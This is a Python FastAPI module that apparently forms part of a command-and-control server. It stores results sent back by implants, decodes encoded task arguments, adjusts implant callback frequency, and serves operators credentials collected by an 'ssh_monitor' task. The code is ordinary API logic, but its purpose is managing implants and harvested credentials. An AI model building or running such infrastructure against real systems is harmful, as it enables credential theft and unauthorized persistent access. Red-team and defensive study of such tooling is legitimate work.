import base64
import binascii
from datetime import datetime, timezone
from typing import List

from fastapi import APIRouter, HTTPException, Depends, Security
from sqlalchemy.exc import SQLAlchemyError

from server.server_helper.auth_helper import oauth2_scheme, verify_token
from server.server_helper.db import get_db, SessionLocal
from server.server_helper.implant_helper import Implant
from server.server_helper.provision_helper import Provision, authenticate_active_agent
from server.server_helper.tasking_helper import Tasking
from server.server_helper.results_helper import Results, ResultsCreate, ResultsRead, ResultsCreds

router = APIRouter(prefix="/results", tags=["results"])

# PROTECTED endpoint for clients to retrieve all gathered creds based on session id
@router.get("/{session}/creds", response_model=List[ResultsCreds])
def get_creds(
    session: str,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme)
):
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    db_result = (
        db.query(Results)
        .filter(Results.session == session, Results.task == "ssh_monitor").all()
    )
    if db_result is None:
        raise HTTPException(status_code=416, detail="Result out of range")
    return db_result


# PROTECTED endpoint for clients to retrieve result based on session id and tasking id
@router.get("/{session}/{id}", response_model=ResultsRead)
def read_result(
    session: str,
    id: int,
    db: SessionLocal = Depends(get_db),  # type: ignore
    token: str = Security(oauth2_scheme),
):
    """
    Provide results of a tasking to the merchant client.
    :param session: The session id of the agent to retrieve tasking
    :param id: The id of the tasking that merchant wants results for
    :param db: The connection to the database
    :param token: The jwt authentication token used to auth to lighthouse
    :return db_result: The result of the tasking provided back in json format
    """
    verify_token(token)
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    db_result = (
        db.query(Results)
        .filter(Results.session == session, Results.tasking_id == id)
        .first()
    )
    if db_result is None:
        raise HTTPException(status_code=416, detail="Result out of range")
    return db_result

# recieve tasking output from agent based on session id, marks task complete = True
@router.post("/{session}", response_model=ResultsCreate)
def create_results(
    session: str,
    results: ResultsCreate,
    db: SessionLocal = Depends(get_db),  # type: ignore
    provision: Provision = Depends(authenticate_active_agent),
):
    """
    The endpoint where agents will send result output back to the lighthouse server
    :param session: The session id tied to the results being sent
    :param results: The results of the provided tasking
    :param db: The db connection to the sqlite database
    :return db_task: The successful tasking result or 404 if the session is not found
    or 400 if the results are not properly formatted
    """
    if session != provision.id:
        raise HTTPException(status_code=403, detail="Agent cannot use this session")

    current_time = datetime.now(timezone.utc).isoformat()
    db_implant = db.query(Implant).filter(Implant.session == session).first()
    if not db_implant:
        raise HTTPException(status_code=404, detail="Session not found")
    if results.args:
        try:
            args_bytes = bytes.fromhex(results.args)
            decoded_args = base64.b64decode(args_bytes.decode("utf-8")).decode("utf-8")
        except (binascii.Error, UnicodeDecodeError, ValueError) as e:
            raise HTTPException(status_code=400, detail=f"Invalid encoded args: {e}")
    else:
        decoded_args = ""
    db_tasking = (
        db.query(Tasking)
        .filter(Tasking.session == session, Tasking.id == results.tasking_id)
        .first()
    )
    if db_tasking is None:
        raise HTTPException(status_code=404, detail="Task not found")

    if results.task != db_tasking.task:
        raise HTTPException(status_code=400, detail="Result does not match task")

    if db_tasking.task != "ssh_monitor":
        existing_result = (
            db.query(Results)
            .filter(
                Results.session == session,
                Results.tasking_id == results.tasking_id,
            )
            .first()
        )
        if existing_result is not None:
            return existing_result

        if db_tasking.complete not in {"False", "Pending"}:
            raise HTTPException(status_code=409, detail="Task is already complete")

    results_data = results.model_dump(exclude={"session", "date"})
    results_data["args"] = decoded_args

    if results_data["task"] == "reconfig":
        update_callback_freq(session, results_data, db)

    db_task = Results(**results_data, session=session, date=current_time)
    try:
        db.add(db_task)
        db_tasking.complete = "True"
        db.commit()
        db.refresh(db_task)
        db.refresh(db_tasking)
    except SQLAlchemyError:
        db.rollback()
        raise

    return db_task


def update_callback_freq(session: str, results_data: dict, db: SessionLocal):  # type: ignore
    new_callback_freq = results_data["args"].split(" ")[0]
    implant = db.query(Implant).filter(Implant.session == session).first()
    if implant is not None and implant.alive:
        implant.callback_freq = new_callback_freq
